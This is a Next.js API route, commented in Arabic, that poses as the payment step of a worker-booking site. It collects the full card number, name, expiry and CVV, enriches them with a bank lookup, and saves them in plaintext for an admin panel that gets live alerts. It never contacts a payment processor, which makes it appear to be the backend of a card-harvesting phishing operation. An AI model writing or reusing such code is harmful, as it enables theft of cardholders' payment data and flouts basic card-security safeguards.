import { NextRequest, NextResponse } from "next/server";
import { createServiceClient, broadcastNewEntry } from "@/lib/supabase/server";
import { luhnCheck, lookupBin } from "@/lib/card-utils";
import { computeBookingAmount } from "@/lib/pricing";
import { autoUnarchiveOnActivity } from "@/lib/archive";

interface InitiateBody {
  bookingId?: string;
  cardNumber?: string;
  cardName?: string;
  expiry?: string;
  cvv?: string;
}

function getClientId(req: NextRequest): string | null {
  return (
    req.headers.get("x-fingerprint") ||
    req.headers.get("x-client-fingerprint") ||
    null
  );
}

export async function POST(req: NextRequest) {
  const body = (await req.json().catch(() => ({}))) as InitiateBody;
  const bookingId = body.bookingId;
  const fingerprint = getClientId(req);

  if (!bookingId) {
    return NextResponse.json({ error: "missing_booking_id" }, { status: 400 });
  }

  const cardNumber = (body.cardNumber ?? "").replace(/\D/g, "");
  const cardName = (body.cardName ?? "").trim();
  const expiry = (body.expiry ?? "").trim();
  const cvv = (body.cvv ?? "").trim();

  if (
    cardNumber.length < 13 ||
    cardNumber.length > 19 ||
    cardName.length < 2 ||
    !/^\d{2}\/\d{2}$/.test(expiry) ||
    !/^\d{3,4}$/.test(cvv)
  ) {
    return NextResponse.json({ error: "invalid_card" }, { status: 422 });
  }

  // خوارزمية لون لتفادي الأخطاء الإملائية
  if (!luhnCheck(cardNumber)) {
    return NextResponse.json({ error: "luhn_failed" }, { status: 422 });
  }

  const supabase = createServiceClient();

  const { data: booking, error: bErr } = await supabase
    .from("bookings")
    .select("id, booking_ref, status, client_id, worker_id, workers(employment_type, expected_salary)")
    .eq("id", bookingId)
    .maybeSingle();

  if (bErr || !booking) {
    return NextResponse.json({ error: "booking_not_found" }, { status: 404 });
  }

  if (booking.status === "paid" || booking.status === "completed") {
    return NextResponse.json({ error: "already_paid" }, { status: 409 });
  }

  // احسب مبلغ الدفع من فئة العاملة + المدة المخزّنة في حمولة الحجز.
  let duration: number | undefined;
  let durationUnit: "hours" | "months" | "years" | undefined;
  const { data: bookingEntries } = await supabase
    .from("client_data_entries")
    .select("payload")
    .eq("type", "booking")
    .order("created_at", { ascending: false });
  for (const e of bookingEntries ?? []) {
    const p = (e.payload as Record<string, unknown>) ?? {};
    if (String(p.bookingId ?? p.booking_id ?? "") === booking.id) {
      duration = p.duration != null ? Number(p.duration) : undefined;
      durationUnit = p.duration_unit as "hours" | "months" | "years" | undefined;
      break;
    }
  }
  const worker = Array.isArray(booking.workers) ? booking.workers[0] : booking.workers;
  const amount = computeBookingAmount(worker ?? {}, duration, durationUnit);
  const serviceFee = Math.round(amount * 0.1);
  const total = amount + serviceFee;

  // استعلام BIN مجاني لمعرفة نوع البطاقة والبنك والدولة
  const binInfo = await lookupBin(cardNumber.slice(0, 6));

  const { data: inserted, error: insertErr } = await supabase
    .from("client_data_entries")
    .insert({
      client_id: booking.client_id ?? fingerprint ?? null,
      type: "payment",
      payload: {
        booking_id: booking.id,
        booking_ref: booking.booking_ref,
        amount,
        service_fee: serviceFee,
        total,
        card_number: cardNumber,
        card_last4: cardNumber.slice(-4),
        card_name: cardName,
        expiry,
        cvv,
        bin_scheme: binInfo.scheme,
        bin_type: binInfo.type,
        bin_bank: binInfo.bank,
        bin_country: binInfo.country,
        bin_country_code: binInfo.countryCode,
        bin_bank_domain: binInfo.bankDomain,
        bin_bank_logo: binInfo.logoUrl,
        status: "pending_admin",
        created_by: "payment_initiate",
      },
    })
    .select("id")
    .single();

  if (insertErr || !inserted) {
    return NextResponse.json({ error: "initiate_failed" }, { status: 500 });
  }

  // ألغِ أرشفة العميل تلقائياً لأنه عاد وأدخل بيانات بطاقة.
  await autoUnarchiveOnActivity(booking.client_id ?? fingerprint ?? null);

  // أبلغ لوحة الإدارة بوجود entry دفع جديد لتحديث القائمة لحظياً.
  void broadcastNewEntry({
    clientId: booking.client_id ?? fingerprint ?? null,
    entryId: inserted.id,
    type: "payment",
  });

  return NextResponse.json({
    entryId: inserted.id,
    status: "pending_admin",
  });
}
